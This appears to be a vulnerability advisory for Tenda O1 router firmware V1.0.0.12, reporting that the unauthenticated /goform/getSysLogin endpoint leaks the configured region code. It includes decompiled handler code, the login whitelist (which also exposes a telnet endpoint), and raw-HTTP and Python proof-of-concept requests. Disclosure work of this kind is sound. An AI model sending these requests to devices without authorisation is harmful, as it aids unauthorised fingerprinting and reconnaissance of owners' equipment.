## Tenda O1 httpd fromSysLoginGet function unauthenticated information disclosure vulnerability

### Product Information

```
Brand: Tenda
Model: O1
Firmware Version: V1.0.0.12
Official Website: https://www.tenda.com.cn
Firmware Download URL: https://www.tenda.com.cn/store/products/146#downloads
```



### Affected Component

```
The fromSysLoginGet function (action name: getSysLogin, address 0x0045B82C) in httpd
```

### Suggested description of the vulnerability

```
Tenda O1 V1.0.0.12 httpd fromSysLoginGet function has an unauthenticated information
disclosure vulnerability.
```

### Vulnerability Details

This firmware (Tenda O1, a heavily customized GoAhead 3.3.0) centralizes its authentication in the `authSecurityHandler` function (0x004A76AC), which runs before every route dispatch (`websRouteRequest` line 11280: `if ( authSecurityHandler(wp) )`). It maintains a source-IP login tracking table `loginUserInfo[10]`; any URL matching its whitelist is allowed by returning `1`, while everything else is redirected to the login page.

`/goform/getSysLogin` is unconditionally included in that unauthenticated whitelist:

```c
// Whitelist check in authSecurityHandler (0x004A76AC)
if ( !strcmp(urlbuf, "/favicon.ico")
  || !strncmp(urlbuf, "/goform/usbTest", 0x100u)
  || !strncmp(urlbuf, "/lang", 0x100u)
  || !strncmp(urlbuf, "/goform/getAdStatistics", 0x100u)
  || !strncmp(urlbuf, "/disable.asp", 0x100u)
  || !strncmp(g_default_pass, g_Pass_0, 0x80u) && !strncmp(urlbuf, "/goform/telnet", 0x100u)
  || !strncmp(urlbuf, "/goform/getLoginInfo", 0x100u)
  || !strncmp(urlbuf, "/goform/getSysLogin", 0x100u)   // <- /goform/getSysLogin unauthenticated
  || !strncmp(urlbuf, "/goform/getQuickset", 0x100u)
  || !strncmp(urlbuf, "/goform/setQuickset", 0x100u)
  || !strncmp(urlbuf, "/password.html", 0xEu)
  || !strncmp(urlbuf, "/preTimeout.asp", 0x100u)
  || !strncmp(urlbuf, "/timeout.asp", 0x100u)
  || !strncmp(urlbuf, "/goform/getPreTimeoutNotify", 0x100u)
  || !strncmp(urlbuf, "/goform/getTimeoutNotify", 0x100u)
  || !strncmp(urlbuf, "/goform/ackPreTimeoutNotify", 0x100u)
  || !strncmp(urlbuf, "/goform/ate", 0x100u) )
{
  return 1;   // <- allowed directly; no login-state / session check at all
}
```

The action `getSysLogin` is dispatched by `actionHandler` (0x00406DA0) to `fromSysLoginGet` (0x0045B82C). That handler reads the configured region code from NVRAM and returns it in a JSON response without performing any authentication of its own:

```c
void __cdecl fromSysLoginGet(webs_t wp, char_t *path, char_t *query)
{
  cJSON *String; // $v0
  cJSON *root; // [sp+18h] [+18h]
  char *out; // [sp+1Ch] [+1Ch]
  char country_code[32]; // [sp+20h] [+20h] BYREF
  char mib_value[64]; // [sp+40h] [+40h] BYREF

  root = cJSON_CreateObject();
  memset(country_code, 0, sizeof(country_code));
  memset(mib_value, 0, sizeof(mib_value));
  GetValue("wl2g.public.country_code", country_code);   // read region code from NVRAM
  if ( !country_code[0] )
    strcpy(country_code, "CN");                         // default to "CN" when unset
  String = cJSON_CreateString(country_code);
  cJSON_AddItemToObject(root, "countryRegion", String); // disclosed as "countryRegion"
  out = cJSON_Object_2String(root);
  websTransfer(wp, out);                                // <- response (information disclosure)
}
```

The disclosed field is the configured region code (`wl2g.public.country_code`), defaulting to `"CN"` when unset. No credentials, token, cookie, or CSRF check is performed anywhere along the path.

The complete data flow is as follows:

```
GET /goform/getSysLogin   (no authentication required, no request parameters)
    └── websRouteRequest()                        [0x00431190]  route dispatch entry
        └── authSecurityHandler()                 [0x004A76AC]  authentication gate
            └── strncmp(urlbuf, "/goform/getSysLogin") matches whitelist -> return 1 (allowed without auth)
        └── actionHandler()                       [0x00406DA0]  /goform action dispatch
            └── fromSysLoginGet(wp, "getSysLogin", query)  [0x0045B82C]
                └── GetValue("wl2g.public.country_code", country_code)  -> disclosed as "countryRegion"
                └── cJSON_Object_2String(root) + websTransfer(wp, out)  -> response (information disclosure)
```

The involved check functions are as follows:

```
- authSecurityHandler(): the authentication gate that should block unauthenticated requests,
  but it unconditionally whitelists /goform/getSysLogin and returns 1 (allowed) before any
  login-state check, which is the root cause of the vulnerability.
- fromSysLoginGet(): performs no authentication/authorization of its own; it directly returns
  the NVRAM region code (countryRegion) to the requester.
```

### Attack

An unauthenticated remote attacker can issue a plain `GET /goform/getSysLogin` request without any cookie, token or credentials. The device responds with a JSON object disclosing the configured region code (`countryRegion`). This leaks a low-sensitivity configuration value that can be used for device fingerprinting and reconnaissance.

### PoC

This is an unauthenticated (pre-authentication) vulnerability; no Token / Cookie is required.

Request:

```http
GET /goform/getSysLogin HTTP/1.1
Host: 192.168.31.6
```

Example response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"countryRegion":"CN"}
```

Equivalent Python PoC (see `Tenda_O1_V1.0.0.12_httpd_unauth_goform_getSysLogin.py`):

```python
import requests
import urllib3

urllib3.disable_warnings()

req = {
    "method": "GET",
    "uri": "/goform/getSysLogin",
    "header": "Host: 192.168.31.6",
    "body": "",
}

BASE_URL = "http://192.168.31.6"

def parse_headers(header_str: str) -> dict:
    headers = {}
    for line in (header_str or "").splitlines():
        line = line.strip()
        if not line:
            continue
        key, _, value = line.partition(":")
        headers[key.strip()] = value.strip()
    return headers

url = BASE_URL + req["uri"]
headers = parse_headers(req["header"])
body = req["body"] or None

resp = requests.request(
    method=req["method"].upper(),
    url=url,
    headers=headers,
    data=body,
    timeout=10,
    verify=False,
)

print("URL:", resp.url)
print("Status code:", resp.status_code)
print("Response headers:", dict(resp.headers))
print("Response body:", resp.text)
```

### Discoverer

Zippy
